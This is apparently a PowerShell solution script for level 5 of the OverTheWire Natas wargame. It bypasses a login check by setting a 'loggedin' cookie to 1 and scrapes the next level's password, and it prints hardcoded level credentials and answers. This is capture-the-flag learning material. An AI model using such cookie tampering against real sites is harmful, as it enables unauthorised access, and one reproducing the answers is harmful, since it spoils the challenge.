<#

Script to retrieve the password of level 5-6

#>
$url = "http://natas5.natas.labs.overthewire.org "
$creds = "natas5:iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"
$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($creds))
$headers = @{ Authorization = "Basic $encodedCreds" }

#We visit the page and get this message 


<#
But we got 
Access disallowed. You are not logged in</div>

Checking around, we see this cookie in response header

HTTP/1.1 200 OK
Date: Fri, 01 May 2020 11:38:29 GMT
Server: Apache/2.4.10 (Debian)
Set-Cookie: loggedin=0              -------------------
Vary: Accept-Encoding
Content-Length: 855
Connection: close
Content-Type: text/html; charset=UTF-

So let us fix it
#>

$s = New-Object Microsoft.PowerShell.Commands.WebRequestSession
$c = New-Object System.Net.Cookie("loggedin", '1', "/", "natas5.natas.labs.overthewire.org")
$s.Cookies.Add($c)



#We know it is something about the referrer header. So we tweak it




Invoke-WebRequest -uri $url -Method Get -Headers $headers -Proxy "http://localhost:8080" -Outfile temp.text -WebSession $s


get-content ./temp.text | Select-String -pattern "(\w{20,})" > res #Redumbdant but meh!!


del ./temp.text 


$a = (get-content res).split("\n")[2]
$myPass =$a.split(" ")

$user = $myPass[5]
$myPass = $myPass[$myPass.length -1]
echo "The password for $user is $myPass"
remove-Item res



<# PS /home/voltron/OTW/natas/pshell_lang>  ./natas6.ps1 
The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div> 
#>                                                                                                                                                                                                                                                                                          #>
